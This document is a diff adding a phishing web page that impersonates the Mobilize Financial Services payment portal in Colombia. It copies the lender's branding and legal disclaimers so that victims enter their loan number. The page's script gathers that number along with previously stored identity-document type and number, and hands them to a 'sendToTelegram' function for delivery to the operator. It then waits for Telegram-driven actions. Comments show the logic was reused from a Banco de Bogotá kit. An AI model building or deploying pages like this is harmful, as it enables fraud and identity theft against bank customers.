@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagos en línea - Mobilize Financial Services</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: Arial, Helvetica, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; flex-direction: column; }
+
+        header { background: #fff; padding: 16px 24px; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }
+        .logo { display: flex; flex-direction: column; line-height: 1; }
+        .logo-top { font-size: 28px; font-weight: 900; color: #1a1a1a; letter-spacing: -0.5px; display: flex; align-items: center; gap: 2px; }
+        .logo-circle { display: inline-block; width: 28px; height: 28px; border-radius: 50%; border: 3px solid #e8391e; position: relative; margin: 0 1px; }
+        .logo-circle::after { content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%) rotate(-45deg); width: 2px; height: 100%; background: #e8391e; }
+        .logo-bottom { font-size: 11px; font-weight: 700; color: #1a1a1a; letter-spacing: 1.5px; }
+
+        main.content { flex: 1; display: flex; justify-content: center; align-items: flex-start; padding: 32px 16px; }
+        .card { background: #fff; border-radius: 16px; padding: 32px 28px; width: 100%; max-width: 440px; box-shadow: 0 2px 12px rgba(0,0,0,0.07); }
+        .card h1 { font-size: 15px; font-weight: 400; color: #444; text-align: center; line-height: 1.5; margin-bottom: 24px; }
+
+        /* Banner de información (estilo Mobilize) */
+        .info-banner {
+            background: #f0f7ff;
+            border: 1px solid #b8d4f0;
+            border-left: 4px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #2c5282;
+            line-height: 1.5;
+        }
+        .info-banner strong { display: block; margin-bottom: 4px; color: #1a1a1a; }
+
+        .input-wrap { position: relative; margin-bottom: 20px; }
+        .input-wrap input { width: 100%; padding: 18px 14px 6px; border: 1.5px solid #ccc; border-radius: 8px; font-size: 15px; color: #1a1a1a; outline: none; background: #fff; transition: border-color .2s; }
+        .input-wrap input:focus { border-color: #1a1a1a; }
+        .input-wrap label { position: absolute; top: 50%; left: 14px; transform: translateY(-50%); font-size: 14px; color: #888; pointer-events: none; transition: all .15s; }
+        .input-wrap input:focus ~ label, .input-wrap input:not(:placeholder-shown) ~ label { top: 8px; font-size: 11px; color: #555; transform: none; }
+
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 50px; font-size: 13px; font-weight: 700; letter-spacing: 1px; cursor: pointer; margin-bottom: 10px; transition: opacity .2s; }
+        .btn:hover { opacity: 0.88; }
+        .btn-dark { background: #1a1a1a; color: #fff; }
+        .btn-gray { background: #d0d0d0; color: #888; cursor: not-allowed; }
+        .btn-gray.active { background: #1a1a1a; color: #fff; cursor: pointer; }
+
+        .disclaimer { max-width: 440px; margin: 0 auto; padding: 0 16px 32px; }
+        .disclaimer p { font-size: 13px; color: #555; line-height: 1.7; text-align: justify; margin-bottom: 14px; }
+
+        footer { background: #fff; border-top: 1px solid #e0e0e0; padding: 20px 24px; display: flex; align-items: center; gap: 16px; }
+        .footer-logo { display: flex; flex-direction: column; line-height: 1; border-left: 3px solid #ccc; padding-left: 12px; }
+        .footer-logo .fl-top { font-size: 16px; font-weight: 900; color: #1a1a1a; display: flex; align-items: center; gap: 1px; }
+        .footer-logo .fl-circle { display: inline-block; width: 16px; height: 16px; border-radius: 50%; border: 2px solid #e8391e; position: relative; margin: 0 1px; }
+        .footer-logo .fl-circle::after { content: ''; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%) rotate(-45deg); width: 1.5px; height: 100%; background: #e8391e; }
+        .footer-logo .fl-bottom { font-size: 7px; font-weight: 700; color: #1a1a1a; letter-spacing: 1px; }
+        .footer-text { font-size: 11px; color: #777; line-height: 1.5; }
+
+        .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
+
+        /* Overlay de carga (estilo Mobilize) */
+        #loading-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(26,26,26,0.85);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .loader-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            animation: rotateLoader 1.5s linear infinite;
+        }
+        .dot { position: absolute; width: 20px; height: 20px; border-radius: 50%; }
+        .dot-red { background-color: #e8391e; top: 0; left: 50%; transform: translateX(-50%); }
+        .dot-dark { background-color: #1a1a1a; bottom: 5px; left: 0; }
+        .dot-gray { background-color: #d0d0d0; bottom: 5px; right: 0; }
+        @keyframes rotateLoader {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) { .card { padding: 24px 18px; } }
+    </style>
+</head>
+<body>
+
+    <!-- Overlay de carga -->
+    <div id="loading-overlay">
+        <div class="loader-container">
+            <div class="dot dot-red"></div>
+            <div class="dot dot-dark"></div>
+            <div class="dot dot-gray"></div>
+        </div>
+    </div>
+
+    <!-- Header Mobilize -->
+    <header>
+        <div class="logo">
+            <div class="logo-top">M<span class="logo-circle"></span>BILIZE</div>
+            <div class="logo-bottom">FINANCIAL SERVICES</div>
+        </div>
+    </header>
+
+    <!-- Contenido principal -->
+    <main class="content">
+        <div>
+            <div class="card">
+                <h1>Ingresa el número de tu crédito para realizar el pago de tu obligación</h1>
+
+                <div class="info-banner">
+                    <strong>Número de crédito</strong>
+                    Ingresa el número de crédito tal como aparece en tu contrato o estado de cuenta.
+                </div>
+
+                <form id="creditForm" autocomplete="off" onsubmit="return sendCreditForm(event);">
+                    <div class="input-wrap">
+                        <input type="text" id="credito" placeholder=" " inputmode="numeric" autocomplete="off">
+                        <label for="credito">Número de crédito *</label>
+                    </div>
+                    <button type="button" class="btn btn-dark" onclick="history.back()">REGRESAR</button>
+                    <button type="submit" class="btn btn-gray" id="btnContinuar" disabled>CONTINUAR</button>
+                </form>
+
+                <div class="error-msg" id="msgError"></div>
+            </div>
+
+            <!-- Disclaimers Mobilize -->
+            <div class="disclaimer">
+                <p>Todos los pagos serán aplicados según el horario bancario definido por la Entidad. De realizarse el pago fuera de este horario, éste será aplicado al siguiente día hábil bancario de conformidad con el Artículo 97 del Decreto 663 de 1993 (Estatuto Orgánico del Sistema Financiero).</p>
+                <p>Todo abono extraordinario realizado no adelantará cuotas del crédito; por defecto, éste será aplicado a capital bajo la modalidad de reducir el plazo. En caso de que desees que dicho abono sea abonado a capital bajo la modalidad de reducir cuota, una vez realices el pago deberás informar a la Entidad escribiendo al correo electrónico clientes@mobilize-fs.com o comunicándote con nuestras líneas de atención.</p>
+                <p>Si posees más de un crédito, es necesario realizar una transacción por cada uno.</p>
+                <p>Para resolver tus inquietudes sobre el crédito, contáctanos a través de nuestras líneas de atención.</p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer Mobilize -->
+    <footer>
+        <div class="footer-logo">
+            <div class="fl-top">M<span class="fl-circle"></span>BILIZE</div>
+            <div class="fl-bottom">FINANCIAL SERVICES</div>
+        </div>
+        <div class="footer-text">Los productos y servicios ofrecidos a través de MOBILIZE FINANCIAL SERVICES, son otorgados por RCI Colombia S.A Compañía de Financiamiento.</div>
+    </footer>
+
+    <!-- ============================================================
+         📌 SCRIPTS (lógica del Banco de Bogotá adaptada)
+         ============================================================ -->
+    <script src="telegram.js"></script>
+    <script src="action.js"></script>
+    <script>
+        if (window.stopListening) window.stopListening();
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const input = document.getElementById('credito');
+            const btn = document.getElementById('btnContinuar');
+            const msgErr = document.getElementById('msgError');
+
+            // Habilitar botón cuando hay texto
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/[^0-9]/g, '');
+                const tiene = input.value.trim().length > 0;
+                btn.disabled = !tiene;
+                btn.classList.toggle('active', tiene);
+                btn.classList.toggle('btn-gray', !tiene);
+                btn.classList.toggle('btn-dark', tiene);
+                msgErr.style.display = 'none';
+            });
+
+            input.focus();
+        });
+
+        // ============================================================
+        // 📤 ENVIAR FORMULARIO DEL CRÉDITO
+        // ============================================================
+        function sendCreditForm(e) {
+            e.preventDefault();
+
+            const input = document.getElementById('credito');
+            const btn = document.getElementById('btnContinuar');
+            const msgErr = document.getElementById('msgError');
+            const creditNumber = input.value.trim();
+
+            if (!creditNumber) {
+                msgErr.textContent = 'Por favor ingresa el número de crédito';
+                msgErr.style.display = 'block';
+                return false;
+            }
+
+            document.getElementById('loading-overlay').style.display = 'flex';
+            btn.disabled = true;
+            btn.textContent = 'Consultando...';
+            msgErr.style.display = 'none';
+
+            if (window.stopListening) window.stopListening();
+            localStorage.removeItem('bbogota_msg_id');
+            if (typeof actionProcessed !== 'undefined') actionProcessed = false;
+
+            const userData = (typeof getUserData === 'function') ? getUserData() : {
+                tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
+                numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
+            };
+
+            const creditData = {
+                credito: creditNumber,
+                tipo_identificacion: userData.tipo_identificacion,
+                numero_identificacion: userData.numero_identificacion
+            };
+
+            // Guardar en localStorage (compatibilidad con Mobilize)
+            localStorage.setItem('userInfo', JSON.stringify(creditData));
+
+            if (typeof sendToTelegram === 'function') {
+                sendToTelegram('credito', creditData, function() {
+                    console.log('✅ Crédito enviado');
+                    if (typeof listenCurrentButtons === 'function') listenCurrentButtons(window.handleTelegramAction);
+                });
+            } else {
+                console.error('❌ sendToTelegram no disponible');
+                // Fallback: redirigir directo (como Mobilize original)
+                window.location.href = 'transaction_summary.html';
+            }
+
+            return false;
+        }
+    </script>
+</body>
+</html>
